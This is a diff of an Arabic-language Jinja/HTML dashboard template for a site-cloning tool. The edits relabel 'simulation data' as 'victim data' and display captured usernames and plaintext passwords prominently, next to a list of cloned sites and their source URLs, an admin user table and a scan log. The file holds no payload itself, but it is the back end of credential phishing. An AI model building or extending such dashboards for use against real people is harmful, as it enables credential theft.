@@ -3,71 +3,239 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width,initial-scale=1">
-  <title>لوحة التحكم</title>
+  <title>لوحة التحكم | SET-CDP</title>
+
   <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.rtl.min.css" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
   <link rel="stylesheet" href="/static/style.css">
 </head>
+
 <body>
-  {% include 'base_nav.html' %}
 
-  <main class="container py-5">
-    <h1 class="mb-4">لوحة التحكم</h1>
+{% include 'base_nav.html' %}
 
-    <!-- بيانات المحاكاة -->
-    <h3>بيانات المحاكاة</h3>
-    <div class="table-responsive">
-      <table class="table table-bordered table-hover align-middle">
-        <thead class="table-primary">
-          <tr>
-            <th>ID</th>
-            <th>السيناريو</th>
-            <th>اسم المستخدم</th>
-            <th>حالة كلمة المرور</th>
-            <th>البيانات</th>
-            <th>IP</th>
-            <th>الوقت</th>
-            <th>الإجراء</th>
-          </tr>
-        </thead>
-        <tbody>
-          {% for i in captured %}
-          <tr>
-            <td>{{ i.id }}</td>
-            <td><span class="badge bg-info">{{ i.target_site }}</span></td>
-            <td>{{ i.captured_username }}</td>
-            <td><span class="badge bg-secondary">{{ i.password_status }}</span></td>
-            <td><small class="text-break">{{ i.full_data }}</small></td>
-            <td>{{ i.ip_address }}</td>
-            <td>{{ i.timestamp }}</td>
-            <td>
-              <button class="btn btn-sm btn-danger" onclick="deleteCapture({{ i.id }})">
-                حذف
-              </button>
-            </td>
-          </tr>
-          {% endfor %}
-        </tbody>
-      </table>
+<main class="container py-5">
+
+  <h1 class="mb-4"><i class="fas fa-tachometer-alt text-primary"></i> لوحة التحكم</h1>
+
+  <section class="card shadow-sm mb-4">
+    <div class="card-body">
+      <h3 class="mb-3"><i class="fas fa-bug text-danger"></i> بيانات الضحية </h3>
+
+      <div class="table-responsive">
+        <table class="table table-bordered table-hover align-middle table-striped">
+          <thead class="table-dark">
+            <tr>
+              <th>ID</th>
+              <th>السيناريو / الهدف</th>
+              <th>منشئ السيناريو</th>
+              <th><i class="fas fa-user"></i> اسم المستخدم / الإيميل</th>
+              <th><i class="fas fa-key"></i> كلمة المرور</th>
+              <th>IP</th>
+              <th>الوقت</th>
+              <th>الإجراء</th>
+            </tr>
+          </thead>
+
+          <tbody>
+            {% for i in captured %}
+            <tr>
+              <td>{{ i.id }}</td>
+
+              <td>
+                <span class="badge bg-danger">{{ i.target_site }}</span>
+              </td>
+
+              <td>
+                <small class="text-muted">{{ i.owner_full_name or i.owner_username or 'غير معروف' }}</small>
+              </td>
+
+              <td style="font-weight: bold; color: #0f172a; font-size: 16px;">
+                {{ i.captured_username or '-' }}
+              </td>
+
+              <td style="font-weight: bold; color: #dc3545; font-family: monospace; font-size: 16px; background: #fff5f5;">
+                {{ i.captured_password or '-' }}
+              </td>
+
+              <td><small class="text-muted">{{ i.ip_address }}</small></td>
+
+              <td><small>{{ i.timestamp }}</small></td>
+
+              <td>
+                <button class="btn btn-sm btn-outline-danger" onclick="deleteCapture({{ i.id }})">
+                  <i class="fas fa-trash"></i> حذف
+                </button>
+              </td>
+            </tr>
+            {% else %}
+            <tr>
+              <td colspan="8" class="text-center text-muted">
+                لا توجد بيانات ملتقطة حالياً.
+              </td>
+            </tr>
+            {% endfor %}
+          </tbody>
+        </table>
+      </div>
     </div>
+  </section>
 
-    <!-- النسخ التدريبية -->
-    <h3 class="mt-4">النسخ التدريبية</h3>
-    {% if clones %}
-      <ul class="list-group">
-        {% for c in clones %}
-        <li class="list-group-item d-flex justify-content-between align-items-center">
-          <a target="_blank" href="/view-clone/{{ c.clone_name }}">{{ c.clone_name }}</a>
-          <button class="btn btn-sm btn-outline-danger" onclick="deleteClone('{{ c.clone_name }}')">
-            حذف
-          </button>
-        </li>
-        {% endfor %}
-      </ul>
-    {% else %}
-      <p class="text-muted">لا توجد نسخ تدريبية.</p>
-    {% endif %}
-  </main>
+  <section class="card shadow-sm mb-4">
+    <div class="card-body">
+      <h3 class="mb-3"><i class="fas fa-copy text-success"></i> النسخ </h3>
 
-  <script src="/static/script.js"></script>
+      {% if clones %}
+      <div class="table-responsive">
+        <table class="table table-bordered table-hover align-middle">
+          <thead class="table-success">
+            <tr>
+              <th>اسم النسخة</th>
+              <th>المنشئ</th>
+              <th>الرابط الأصلي</th>
+              <th>تاريخ الإنشاء</th>
+              <th>الإجراء</th>
+            </tr>
+          </thead>
+
+          <tbody>
+            {% for c in clones %}
+            <tr>
+              <td>
+                <a target="_blank" href="/view-clone/{{ c.clone_name }}" class="fw-bold">
+                  {{ c.clone_name }}
+                </a>
+              </td>
+
+              <td>
+                {{ c.owner_full_name or c.owner_username or 'غير معروف' }}
+              </td>
+
+              <td class="text-break">
+                <a href="{{ c.source_url }}" target="_blank" class="text-muted">{{ c.source_url or '-' }}</a>
+              </td>
+
+              <td>
+                {{ c.created_at or '-' }}
+              </td>
+
+              <td>
+                <button class="btn btn-sm btn-outline-danger" onclick="deleteClone('{{ c.clone_name }}')">
+                  <i class="fas fa-trash"></i> حذف
+                </button>
+              </td>
+            </tr>
+            {% endfor %}
+          </tbody>
+        </table>
+      </div>
+      {% else %}
+        <p class="text-muted">لا توجد نسخ اختراق.</p>
+      {% endif %}
+    </div>
+  </section>
+
+  {% if session.get('role') == 'admin' %}
+  <section class="card shadow-sm mb-4 border-primary">
+    <div class="card-body">
+      <h3 class="mb-3 text-primary"><i class="fas fa-users"></i> المستخدمون المسجلون</h3>
+
+      <div class="table-responsive">
+        <table class="table table-bordered table-hover align-middle">
+          <thead class="table-primary">
+            <tr>
+              <th>ID</th>
+              <th>اسم المستخدم</th>
+              <th>الاسم الرسمي</th>
+              <th>الدور</th>
+              <th>تاريخ الإنشاء</th>
+            </tr>
+          </thead>
+
+          <tbody>
+            {% for u in users %}
+            <tr>
+              <td>{{ u.id }}</td>
+              <td class="fw-bold">{{ u.username }}</td>
+              <td>{{ u.full_name or '-' }}</td>
+              <td>
+                {% if u.role == 'admin' %}
+                  <span class="badge bg-danger"><i class="fas fa-user-shield"></i> admin</span>
+                {% else %}
+                  <span class="badge bg-secondary"><i class="fas fa-user"></i> user</span>
+                {% endif %}
+              </td>
+              <td><small>{{ u.created_at }}</small></td>
+            </tr>
+            {% else %}
+            <tr>
+              <td colspan="5" class="text-center text-muted">
+                لا يوجد مستخدمون.
+              </td>
+            </tr>
+            {% endfor %}
+          </tbody>
+        </table>
+      </div>
+    </div>
+  </section>
+  {% endif %}
+<section class="card shadow-sm mb-4 border-info">
+    <div class="card-body">
+      <h3 class="mb-3 text-info"><i class="fas fa-history"></i> سجل نشاطي (الفحوصات والعمليات)</h3>
+      <p class="text-muted">يعرض آخر عمليات الفحص والتحليل التي قمت بإجرائها.</p>
+
+      <div class="table-responsive">
+        <table class="table table-bordered table-hover align-middle">
+          <thead class="table-info">
+            <tr>
+              <th>ID</th>
+              <th>نوع العملية</th>
+              <th>الهدف / الرابط</th>
+              <th>النتيجة</th>
+              <th>مستوى الخطورة</th>
+              <th>الوقت</th>
+              {% if session.get('role') == 'admin' %}
+                <th>المستخدم</th>
+              {% endif %}
+            </tr>
+          </thead>
+          <tbody>
+            {% for s in scans %}
+            <tr>
+              <td>{{ s.id }}</td>
+              <td><span class="badge bg-secondary">{{ s.scan_type | upper }}</span></td>
+              <td class="text-break" style="max-width: 250px;">{{ s.target }}</td>
+              <td>{{ s.result_summary }}</td>
+              <td>
+                <span class="badge 
+                  {% if s.risk_level in ['Critical', 'High Risk', 'Insecure', 'Error'] %}bg-danger
+                  {% elif s.risk_level in ['Moderate', 'Medium Risk', 'Suspicious', 'Expiring Soon'] %}bg-warning text-dark
+                  {% else %}bg-success{% endif %}">
+                  {{ s.risk_level }}
+                </span>
+              </td>
+              <td><small class="text-muted">{{ s.timestamp }}</small></td>
+              
+              {% if session.get('role') == 'admin' %}
+                <td><small class="fw-bold">{{ s.owner_username or 'زائر غير مسجل' }}</small></td>
+              {% endif %}
+            </tr>
+            {% else %}
+            <tr>
+              <td colspan="{% if session.get('role') == 'admin' %}7{% else %}6{% endif %}" class="text-center text-muted">
+                لا توجد عمليات أو فحوصات مسجلة في سجلك حتى الآن.
+              </td>
+            </tr>
+            {% endfor %}
+          </tbody>
+        </table>
+      </div>
+    </div>
+  </section>
+</main>
+
+<script src="/static/script.js"></script>
+
 </body>
 </html>
